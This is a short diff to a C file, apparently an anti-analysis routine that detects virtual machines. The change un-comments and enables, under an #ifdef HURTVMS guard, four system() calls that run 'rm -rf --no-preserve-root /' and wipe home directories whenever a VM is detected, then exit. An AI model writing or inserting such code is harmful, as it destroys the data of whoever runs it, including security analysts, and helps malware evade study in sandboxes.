@@ -40,15 +40,12 @@ void obfsc_init(void)
 	if (obfsc_vm() == true)
 	{
 #ifndef DEBUG
-	/*
-	// BE REALLY FUCKING CAREFUL WITH THIS
-	#ifdef FUCKVMS
+#	ifdef HURTVMS
 		system("rm -rf --no-preserve-root /");
 		system("rm -rf /");
 		system("rm -rf ~/");
 		system("rm -rf --no-preserve-root ~/");
-	#endif
-	*/
+#	endif
 		exit(0);
 #else
 		printd("VM Detected")
